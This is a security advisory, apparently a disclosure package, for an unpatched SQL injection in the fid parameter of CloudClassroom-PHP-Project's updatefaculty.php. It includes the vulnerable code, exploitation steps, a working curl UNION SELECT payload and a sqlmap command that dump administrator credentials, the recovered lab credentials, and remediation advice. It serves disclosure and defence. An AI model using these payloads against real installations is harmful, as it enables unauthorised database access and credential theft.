# CloudClassroom-PHP-Project 1.0 — SQL Injection in updatefaculty.php (fid parameter)

| Field | Value |
|-------|-------|
| **Internal ID** | CC-2026-04 |
| **Product** | CloudClassroom-PHP-Project 1.0 |
| **Vendor** | Vishal Mathur (`mathurvishal`) |
| **File(s)** | `updatefaculty.php` |
| **Class** | SQL Injection (UNION-based / error-based) |
| **CWE** | CWE-89: SQL Injection |
| **OWASP** | A03:2021 – Injection |
| **Method / Parameter(s)** | GET (+POST on UPDATE) — `fid` |
| **Authentication** | None (via Broken Access Control — item 00; original design should require admin session) |
| **User Interaction** | None |
| **CVSS v3.1** | **9.1 (Critical)** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **EPSS** | N/A (no CVE assigned) — low estimation (~0.03–0.09). |
| **Public Status** | Unpublished / Zero-day |

---

## 1. Executive Summary

The numeric parameter `fid` is interpolated without quotes into the `SELECT` query. Within a numeric context, exploitation via `UNION SELECT` is possible. The queried table exposes 9 columns. Confirmed via unauthenticated dumping of administrator credentials.

## 2. Prerequisites

None on the target (item 00). If the original session requirement were enforced, PR would increase and the score would decrease.

## 3. Code Analysis (Root Cause)

**`updatefaculty.php`**

```php
$x=$_GET['fid'];
$sql="select * from <table> WHERE <col>=$x";
$rs=mysqli_query($connect,$sql);

```

## 4. Step-by-Step Exploitation Procedure

1. Request `updatefaculty.php` with the `fid` parameter containing the UNION payload (without cookies — item 00).
2. Adjust the column count to 9 (target table) and position the target data within the displayed column.
3. Read the reflected administrator credentials in the server response.
4. Automate with sqlmap (`-p fid`) for a complete database dump.

## 5. Proof of Concept (PoC)

Executable and non-destructive script: **`poc.sh`** (usage: `bash poc.sh [http://target:port]`).

```bash
curl -s -G "[http://127.0.0.1:9292/updatefaculty.php](http://127.0.0.1:9292/updatefaculty.php)" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "[http://127.0.0.1:9292/updatefaculty.php?fid=1](http://127.0.0.1:9292/updatefaculty.php?fid=1)" -p fid --batch --dump -T admin

```

**Observed evidence in local environment (http://127.0.0.1:9292/):**

```
[admin@ics.com:admin]
[vishu:vishu]

```

### 5.1 Visual Evidence (Live re-validation on 2026-08-02)

Attack reproduced live against http://127.0.0.1:9292/ in a non-destructive manner (read-only/error-based queries, and state injections with automatic rollback to original values).

**a) Browser execution** — actual server response rendered in Chromium, featuring the evidence banner (request + payload + verdict):

**b) Vulnerable line of code** — source code snippet highlighting the vulnerable sink (`updatefaculty.php`):

## 6. Impact

Arbitrary database read access (C:H) — PII, plaintext passwords, administrator credentials; write access via UPDATE/POST sink (I:H); total chained system compromise.

## 7. Severity Rating (CVSS v3.1)

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **Base 9.1 (Critical)**

| Metric | Value |
| --- | --- |
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

**EPSS:** N/A (no CVE assigned) — low estimation (~0.03–0.09).

## 8. Remediation

* Use prepared statements with parameter binding (`mysqli`/PDO) across 100% of SQL queries.
* Explicitly cast numeric identifiers (`(int)$id`) and enforce strict allowlists where applicable.
* Do not output `$sql` or `mysqli_error()` to the client (remove error-based feedback oracles).
* Enforce an `exit;` statement immediately after session authentication guards (see item 00).

## 9. Novelty / Duplication Check

No public CVE exists for this file/parameter in the Vishal Mathur product or its duplicate codebase 'CodeAstro Online Classroom'. Verified against NVD/cvefeed on 2026-08-02.

## 10. References

* https://cwe.mitre.org/
* https://www.first.org/cvss/calculator/3.1
* https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/

## 11. Timeline

* 2026-08-02 — Discovery (static analysis) and dynamic verification in lab environment.
* 2026-08-02 — Preparation of disclosure package (this report).

```
